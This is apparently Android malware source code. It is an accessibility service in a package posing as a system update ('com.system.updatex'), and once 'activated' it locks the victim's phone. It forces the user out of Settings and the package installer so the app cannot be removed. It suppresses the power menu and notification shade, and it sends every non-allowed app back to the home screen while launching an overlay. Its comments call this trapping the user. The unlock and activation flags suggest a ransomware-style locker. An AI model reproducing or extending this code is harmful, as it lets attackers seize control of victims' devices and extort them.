package com.system.updatex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

public class KioskAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE).getBoolean("is_unlocked", false);
        boolean isActivated = getSharedPreferences("fr4nx_state", MODE_PRIVATE).getBoolean("is_activated", false);
        
        // IF UNLOCKED OR NOT YET ACTIVATED, DO NOTHING
        // This allows the user to roam Settings BEFORE the trap drops
        if (isUnlocked) return;
        if (!isActivated) return; 

        if (event == null || event.getPackageName() == null) return;
        
        String foregroundPackage = event.getPackageName().toString();
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        // 1. KILL SETTINGS (Now that the trap is active, Settings is dead)
        if (foregroundPackage.contains("settings") || foregroundPackage.contains("packageinstaller")) {
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            return;
        }

        // 2. KILL NOTIFICATION SHADE & POWER MENU (Beast mode)
        if (foregroundPackage.contains("systemui")) {
            if (className.contains("GlobalActions") || className.contains("NotificationShade") || className.contains("StatusBar")) {
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                return;
            }
        }

        // 3. TRAP THE USER
        boolean isAllowed = foregroundPackage.equals("com.system.updatex") 
                || foregroundPackage.contains("launcher") 
                || foregroundPackage.contains("systemui")
                || foregroundPackage.contains("inputmethod");

        if (!isAllowed) {
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            Intent intent = new Intent(this, OverlayService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }
    @Override
    public void onInterrupt() {}
}
